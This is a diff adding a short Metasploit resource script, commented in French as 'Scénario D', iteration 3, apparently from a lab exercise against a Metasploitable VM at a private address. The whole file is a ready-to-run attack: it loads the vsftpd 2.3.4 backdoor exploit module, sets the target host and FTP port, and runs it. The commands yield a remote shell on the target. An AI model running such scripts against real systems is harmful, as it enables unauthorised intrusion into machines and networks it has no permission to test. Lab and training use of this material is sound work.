@@ -1,0 +1,9 @@
+# Scénario D — Exploitation vsftpd 2.3.4 (Metasploit)
+# Itération : 3
+# Cible : metasploitable 10.0.10.30
+# Lancer avec : msfconsole -r attack.rc
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.0.10.30
+set RPORT 21
+run
